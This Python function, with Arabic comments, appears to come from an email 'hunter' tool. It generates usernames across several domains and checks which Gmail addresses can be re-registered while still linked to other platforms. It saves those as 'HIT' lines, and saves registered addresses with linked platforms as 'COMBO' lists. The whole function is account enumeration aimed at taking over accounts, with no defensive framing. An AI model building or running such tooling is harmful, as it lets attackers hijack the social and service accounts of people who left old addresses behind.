def hunter_engine_v7(mode, prefix, length, domains):
    global hits, bad, checked, banned, stop_thread
    
    # محرك الصيد المزدوج
    while not stop_thread:
        try:
            # 1. توليد اليوزر (أحرف + أرقام)
            user = Generator.create_user(prefix, length)
            for dom in domains:
                if stop_thread: break
                email = f"{user}@{dom}"
                checked += 1
                
                # تحديث سطر الحالة الذكي (تخمين مستمر في سطر واحد)
                # هذا السطر يمنع الفراغات ويجعلك ترى العمل في الخلفية
                status = f"{W} [{checked}] {G}SCANNING: {S}{email} {W}| {F}HITS: {hits} {W}| {Z}BANNED: {banned}"
                sys.stdout.write(f"\r{status}")
                sys.stdout.flush()

                # --- الخيار الأول: متاح للإنشاء ومرتبط ---
                if mode == "1":
                    status_gmail = Checkers.check_gmail_advanced(email)
                    if status_gmail == "BANNED":
                        banned += 1
                        continue
                    elif status_gmail == True:
                        # فحص كافة المنصات إذا كان البريد متاحاً
                        platforms = Checkers.get_all_linked(email)
                        if platforms:
                            hits += 1
                            # طباعة الصيد في سطر جديد تماماً كما في صورتك
                            print(f"\n{F}[HIT] {hits} - AVAILABLE: {W}{email} {F}→ {X}{' + '.join(platforms)}")
                            save_data(RECREATE_FILE, f"[HIT] {email} | Platforms: {' + '.join(platforms)}")
                    else:
                        bad += 1

                # --- الخيار الثاني: مسجل ومرتبط (كومبو) ---
                elif mode == "2":
                    platforms = Checkers.get_all_linked(email)
                    if platforms:
                        hits += 1
                        # طباعة الكومبو في سطر جديد مع كافة المنصات
                        print(f"\n{S}[COMBO] {hits} - HIT: {W}{email} {S}→ {M}{' + '.join(platforms)}")
                        save_data(HITS_FILE, f"{email} | Platforms: {' + '.join(platforms)}")
                    else:
                        bad += 1
            
            # سرعة التنفيذ
            time.sleep(0.001)
        except Exception as e:
            continue

